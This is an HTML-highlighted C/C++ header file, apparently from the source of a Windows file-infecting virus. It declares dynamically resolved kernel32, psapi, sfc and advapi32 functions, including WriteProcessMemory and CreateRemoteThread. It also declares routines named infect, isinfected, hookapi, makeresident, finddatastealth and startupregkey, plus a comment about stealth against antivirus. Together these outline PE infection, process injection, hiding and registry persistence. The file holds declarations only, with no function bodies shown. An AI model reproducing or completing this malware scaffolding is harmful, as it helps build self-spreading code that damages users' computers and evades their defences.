</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iCreateMutexW</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpMutexAttributes</span><span class="sc10">,</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">bInitialOwner</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpName</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iReleaseMutex</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hMutex</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iWaitForSingleObject</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hHandle</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwMilliseconds</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iSleep</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iGetModuleFileNameA</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hModule</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpFilename</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nSize</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iGetSystemDirectoryW</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">uSize</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iSfcIsFileProtected</span><span class="sc10">(</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">RpcHandle</span><span class="sc10">,</span><span class="sc16">short</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">ProtFileName</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iGetTickCount</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iGetFullPathNameW</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpFileName</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nBufferLength</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpBuffer</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpFilePart</span><span class="sc0">  </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">ilstrlenW</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lpString</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">iIsBadWritePtr</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lp</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ucb</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">STDCALL</span><span class="sc0"> </span><span class="sc11">iRegOpenKeyExA</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">STDCALL</span><span class="sc0"> </span><span class="sc11">iRegEnumValueW</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">int</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">STDCALL</span><span class="sc0"> </span><span class="sc11">iRegCloseKey</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">api_</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* kernel32.dll */</span><span class="sc0">

    </span><span class="sc11">iCreateFileW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">CreateFileW</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iFindFirstChangeNotificationW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FindFirstChangeNotificationW</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iFindFirstFileExW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FindFirstFileExW</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iFindNextFileW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FindNextFileW</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">iGetVersion</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetVersion</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iLoadLibraryA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">LoadLibraryA</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iGetProcAddress</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetProcAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iCreateFileMappingW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">CreateFileMappingW</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iMapViewOfFile</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">MapViewOfFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iCloseHandle</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">CloseHandle</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iUnmapViewOfFile</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">UnmapViewOfFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iVirtualAllocEx</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">VirtualAllocEx</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iVirtualFree</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">VirtualFree</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iVirtualProtect</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">VirtualProtect</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iVirtualQuery</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">VirtualQuery</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iOpenProcess</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">OpenProcess</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iReadProcessMemory</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">ReadProcessMemory</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iWriteProcessMemory</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">WriteProcessMemory</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iCreateRemoteThread</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">CreateRemoteThread</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iGetModuleHandleA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetModuleHandleA</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iGetLastError</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetLastError</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iSetLastError</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">SetLastError</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iFindFirstFileW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FindFirstFileW</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iFindClose</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FindClose</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iFileTimeToSystemTime</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">FileTimeToSystemTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iSystemTimeToFileTime</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">SystemTimeToFileTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iGetFileSize</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetFileSize</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iWideCharToMultiByte</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">WideCharToMultiByte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iSetFilePointer</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">SetFilePointer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iSetEndOfFile</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">SetEndOfFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iSetFileTime</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">SetFileTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iGetFileTime</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetFileTime</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iSleep</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Sleep</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iGetModuleFileNameA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetModuleFileNameA</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iGetSystemDirectoryW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetSystemDirectoryW</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iGetTickCount</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetTickCount</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iGetFullPathNameW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">GetFullPathNameW</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">ilstrlenW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">lstrlenW</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iIsBadWritePtr</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">IsBadWritePtr</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* user32.dll */</span><span class="sc0">

    </span><span class="sc11">iCharUpperA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">CharUpperA</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* psapi.dll */</span><span class="sc0">
                   
    </span><span class="sc11">iEnumProcesses</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">EnumProcesses</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iEnumProcessModules</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">EnumProcessModules</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* sfc.dll */</span><span class="sc0">
    </span><span class="sc11">iSfcIsFileProtected</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">SfcIsFileProtected</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* advapi32.dll */</span><span class="sc0">

    </span><span class="sc11">iRegOpenKeyExA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">RegOpenKeyExA</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iRegEnumValueW</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">RegEnumValueW</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">iRegCloseKey</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">RegCloseKey</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">api</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#include "inc\mz.hpp"
#include "inc\pe.hpp"
</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hookglobal_</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">api</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">inapi</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc2">//avoid hooked api loops
</span><span class="sc0">    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc2">//flags for current process
</span><span class="sc0">    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">rnd32seed</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">avbuffer</span><span class="sc10">[</span><span class="sc4">520</span><span class="sc10">];</span><span class="sc0"> </span><span class="sc2">//used by stealth_av, as fake argument to createfilew
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">hookglob</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc6">"C"</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

</span><span class="sc2">//asm
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">crc32</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">getk32base</span><span class="sc10">();</span><span class="sc0"> 
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">poordasm</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">code</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">    </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">hookentry</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">//cpp
</span><span class="sc16">void</span><span class="sc0">    </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">doregistery</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0">  </span><span class="sc11">getprocsum</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">getrnd32</span><span class="sc10">(</span><span class="sc11">hookglob</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hg</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0">   </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">getrndfile</span><span class="sc10">(</span><span class="sc11">hookglob</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hg</span><span class="sc10">,</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">isspecialfiletime</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">FILETIME</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">filetime</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">    </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">finddatastealth</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">,</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">wfd</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">rva2raw</span><span class="sc10">(</span><span class="sc11">MZ_HEADER</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">mz</span><span class="sc10">,</span><span class="sc11">PE_HEADER</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">pe</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">isinfected</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">    </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc19">import</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">void</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0">   </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">openfile</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*,</span><span class="sc11">FILEIO</span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">    </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">closefile</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc11">FILEIO</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">    </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">al</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0">   </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">alloc</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">    </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">dst</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">src</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">hookapi</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">crc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">fn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">    </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">makeresident</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">vimbase</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">changeprot</span><span class="sc10">(</span><span class="sc11">api</span><span class="sc10">*,</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">flags</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0">    </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">hookhandler</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">arg1</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hookn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">**</span><span class="sc0"> </span><span class="sc11">arg1p</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">isgoodname</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">,</span><span class="sc11">api</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">//hacks, hidden at the bottom, ignore them :)
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">crcs</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">blacklist</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">org9entry</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">hostentryrva</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">startupregkey</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc9">#endif </span><span class="sc2">//MAINHPP_INCLUDED
</span></div></body>
</html>
